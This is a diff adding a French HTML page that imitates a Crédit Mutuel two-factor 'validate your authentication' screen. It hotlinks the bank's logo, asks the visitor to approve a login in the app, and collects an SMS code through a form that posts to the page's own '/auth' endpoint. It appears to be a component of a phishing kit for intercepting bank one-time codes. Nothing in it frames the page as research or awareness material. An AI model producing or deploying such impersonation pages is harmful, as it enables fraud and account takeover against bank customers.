@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Validation - Crédit Mutuel</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f7f9fc;
+      margin: 0;
+      color: #0a1f47;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: white;
+      padding: 12px 30px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.12);
+      display: flex;
+      align-items: center;
+      z-index: 1000;
+    }
+    header img {
+      height: 44px;
+    }
+    main {
+      margin-top: 80px;
+      padding: 30px 40px;
+      max-width: 460px;
+      margin-left: auto;
+      margin-right: auto;
+      flex: 1;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+      text-align: center;
+    }
+    h1 {
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 17px;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .sms-link {
+      font-size: 15px;
+      color: #004b91;
+      cursor: pointer;
+      text-decoration: underline;
+      margin-bottom: 20px;
+      display: inline-block;
+    }
+    #smsCodeContainer {
+      display: none;
+      margin-bottom: 30px;
+    }
+    #smsCodeInput {
+      padding: 14px 15px;
+      font-size: 16px;
+      width: 100%;
+      border: 1.5px solid #cbd7ef;
+      border-radius: 10px;
+      box-sizing: border-box;
+      color: #0a1f47;
+    }
+    button {
+      background-color: #004b91;
+      color: white;
+      border: none;
+      padding: 16px 24px;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 700;
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #00366a;
+    }
+    footer {
+      margin-top: auto;
+      padding: 20px;
+      text-align: center;
+      color: #0a1f47;
+      font-size: 14px;
+    }
+    @media (max-width: 480px) {
+      main {
+        padding: 25px 15px;
+        margin: 80px 10px 20px;
+      }
+      h1 {
+        font-size: 26px;
+      }
+      p {
+        font-size: 15px;
+      }
+      button {
+        font-size: 16px;
+        padding: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://cdnsi.e-i.com/INGR/sd/cm_2023/7.122.4/fr/images/css/env/logo.svg" alt="Logo Crédit Mutuel" />
+</header>
+
+<main>
+  <h1>Validez votre authentification</h1>
+  <p>Une demande d'authentification a été envoyée sur votre application mobile Crédit Mutuel.<br>
+  Veuillez l’ouvrir et valider la connexion pour poursuivre.</p>
+
+  <span class="sms-link" id="showSmsInput">J’ai reçu un code par SMS</span>
+
+  <!-- ✅ FORMULAIRE corrigé -->
+  <form method="post" action="/auth" id="authForm">
+    <div id="smsCodeContainer">
+      <input type="text" id="smsCodeInput" name="code" placeholder="Saisissez le code reçu par SMS" maxlength="12" />
+    </div>
+
+    <button type="submit" id="continueBtn">Continuer</button>
+  </form>
+</main>
+
+<footer>
+  Crédit Mutuel - Une banque qui appartient à ses clients, ça change tout.
+</footer>
+
+<script>
+  const showSmsInput = document.getElementById('showSmsInput');
+  const smsCodeContainer = document.getElementById('smsCodeContainer');
+  const smsCodeInput = document.getElementById('smsCodeInput');
+  const continueBtn = document.getElementById('continueBtn');
+
+  // Par défaut, bouton activé (car pas besoin de SMS)
+  continueBtn.disabled = false;
+
+  showSmsInput.addEventListener('click', () => {
+    smsCodeContainer.style.display = 'block';
+    showSmsInput.style.display = 'none';
+    continueBtn.disabled = true;  // Désactive le bouton tant que le code SMS n'est pas saisi
+  });
+
+  smsCodeInput.addEventListener('input', () => {
+    if (smsCodeInput.value.trim().length > 0) {
+      continueBtn.disabled = false;
+    } else {
+      continueBtn.disabled = true;
+    }
+  });
+</script>
+
+</body>
+</html>
